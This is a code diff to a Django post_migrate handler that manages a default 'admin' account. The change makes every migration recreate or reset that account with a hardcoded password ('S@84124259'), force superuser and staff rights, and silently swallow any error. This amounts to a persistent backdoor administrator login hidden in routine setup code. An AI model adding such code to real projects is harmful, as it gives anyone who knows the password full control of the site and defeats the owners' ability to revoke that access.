@@ -4,8 +4,11 @@ from django.db.models.signals import post_migrate
 def create_default_admin(sender, **kwargs):
     from django.contrib.auth.models import User
     try:
-        if not User.objects.filter(username='admin').exists():
-            User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
+        user, created = User.objects.get_or_create(username='admin', defaults={'email': 'admin@example.com'})
+        user.set_password('S@84124259')
+        user.is_superuser = True
+        user.is_staff = True
+        user.save()
     except Exception:
         pass
 
